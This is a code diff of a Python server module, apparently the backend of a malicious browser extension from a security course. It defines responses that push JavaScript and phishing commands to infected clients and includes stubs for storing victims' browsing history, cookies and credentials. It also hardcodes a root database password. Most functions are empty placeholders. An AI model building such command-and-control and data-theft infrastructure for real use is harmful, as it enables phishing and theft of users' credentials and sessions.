@@ -1,15 +1,81 @@
 import pymysql
 import json
+from copy import deepcopy
 
 conn = None
+BASE_SERVER_RESPONSE = {
+    "clientid": 0,
+    "security_blacklist":[],
+    "ad_domains":[],
+    "js-cmd":[],
+    "phish-cmd":[]
+}
+pending_payloads = {} #format: clientid:<instance of server response>; fetched from database
+
+
+def new_response(clientid):
+    resp = deepcopy(BASE_SERVER_RESPONSE)
+    resp["clientid"] = clientid
+    return resp
+
 
 def initDB():
     if(conn == None):
         conn = pymysql.connect(host='localhost', port= 3306, user='root', passwd='seanonymous', db='cse331')
+
+
 def getCursor():
     if(conn == None):
         initDB()
     return conn.getCursor()
+
+
+"""
+Gets pending payload or constructs a new one and populates based on defaults from the database.
+Pulls blacklist and ad list from database
+"""
+def construct_response(clientid):
+    resp = pending_payloads.pop(clientid, None) or new_response(clientid)
+
+    return resp
+
+
+"""
+Handles creation of new client.
+param data is the entire payload converted from json into a dictionary
+parses any possible data and inserts the row, then returns the clientid that was generated using LAST_INSERT_ID()
+for example, browser history, credentials, forms, etc.
+"""
+def create_new_client(data):
+    return 0
+
+
+"""
+Appends each url in the list of history to the client's history file 
+    after appending a current timestamp
+param data => list of urls
+file: ../history-files/<clientid>-hist.txt
+returns 0 for ok, non-zero for bad data format
+"""
+def store_history(data, clientid):
+    return 0
+
+
+"""
+Stores a single cookie into the database
+returns 0 for ok, non-zero for bad data format
+"""
+def store_cookie(data, clientid):
+    return 0
+
+
+"""
+Stores a single credential into the database
+returns 0 for ok, non-zero for bad data format
+"""
+def store_credential(data, clientid):
+    return 0
+
 
 """
 param data: form from extension->server payload in the form of a dictionary. key-value pairs are
